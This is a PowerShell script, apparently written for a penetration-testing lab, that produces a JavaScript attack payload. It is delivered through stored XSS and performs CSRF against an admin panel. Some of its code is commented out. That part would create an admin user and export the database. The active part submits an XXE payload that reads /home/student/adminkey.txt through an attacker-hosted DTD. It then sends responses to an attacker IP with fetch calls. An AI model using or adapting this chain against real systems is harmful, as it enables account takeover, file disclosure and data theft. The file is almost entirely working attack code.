#[System.Web.HttpUtility]::UrlEncode('');
#[System.Web.HttpUtility]::UrlDecode('');
$javascript = @'
const attacker_ip = '192.168.119.131';
/*var h1s = document.getElementsByTagName("h1");
fetch(`http://${attacker_ip}/`+h1s[1].textContent, {});
*/
const host = 'answers'
const host_ip = '192.168.131.251'
/*
username = "wiggles1234"
email = "wiggles1234@email.com"
isAdmin = "true"
isMod = "true"
let config = {
      "method":"POST",
      "credentials":"include",
      mode: "cors",
      headers: {
            "Content-Type": "application/x-www-form-urlencoded"
      },
      body: "name=" + encodeURIComponent(username) + "&email=" + encodeURIComponent(email) + "&isAdmin=" + encodeURIComponent(isAdmin) + "&isMod=" + encodeURIComponent(isMod)
  };

  /// Create an Admin user and seed values to crack the users password
let start = Date.now();
doRequest(`http://${host_ip}/admin/users/create`, config);
let end = Date.now();

fetch(`http://${attacker_ip}/?start_time=` + start, {
  mode: "cors",
});

fetch(`http://${attacker_ip}/?end_time=` + end, {
  mode: "cors",
});

// Export the DataBase
config = {
  "method":"GET",
  "credentials":"include",
  mode: "cors",
  headers: {
        "Content-Type": "application/xml"
  },
};
doRequest(`http://${host_ip}/admin/export`, config);
*/
// Import Data into the database
let xmldata = `
<!DOCTYPE data [
  <!ENTITY % start "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///home/student/adminkey.txt" >
  <!ENTITY % end "]]>">
  <!ENTITY % dtd SYSTEM "http://${attacker_ip}/wrapper.dtd" >
  %dtd;
  ]>
  <database><categories><category><name>&wrapper;</name></category></categories></database>
`;
config = {
  "method":"POST",
  "credentials":"include",
  mode: "cors",
  headers: {
    "Content-Type": "application/x-www-form-urlencoded",
  }, 
  body:  "preview=true&xmldata="+ encodeURIComponent(xmldata)
};
doRequest1(`http://${host_ip}/admin/import`, config);





// Helper Functions
function doRequest(endpoint, cfg) {

  fetch(endpoint, cfg).then(async (response) => {
      fetch(`http://${attacker_ip}/?endpoint=` + endpoint, {
        mode: "cors",
      });   
      fetch(`http://${attacker_ip}/?status_code=` + response.status, {
        mode: "cors",
      });
    if(response.status < 400) {
      let data = await response.text();
      fetch(`http://${attacker_ip}/?exfil=` + data.length, {
        mode: "cors",
      });
    }
  }).catch((error) => {
       fetch(`http://${attacker_ip}/?error=` + error, {
        mode: "cors",
      });   
  });
}

function doRequest1(endpoint, cfg) {

  fetch(endpoint, cfg).then(async (response) => {
      fetch(`http://${attacker_ip}/?endpoint=` + endpoint, {
        mode: "cors",
      });   
      fetch(`http://${attacker_ip}/?status_code=` + response.status, {
        mode: "cors",
      });
    if(response.status < 400) {
      let data = await response.text();
      fetch(`http://${attacker_ip}/?exfil=` + encodeURIComponent(data), {
        mode: "cors",
      });
    }
  }).catch((error) => {
       fetch(`http://${attacker_ip}/?error=` + error, {
        mode: "cors",
      });   
  });
}
'@
$csrf_payload = New-Item -ItemType File -Path "cucked.js" -Value $javascript -Force
#$xss_payload = "`"><script src='http://192.168.119.131/$($csrf_payload.name)'></script>"
#Invoke-WebRequest -Uri "http://answers/question" -Method POST -body "title=hax&description=$xss_payload&category=1"
#$job = Start-Job -ScriptBlock {python3 simple-cors-http-server.py 80}
# sleep for 5 seconds then we should have the output of the job



#Remove-Item -Path $csrf_payload.Name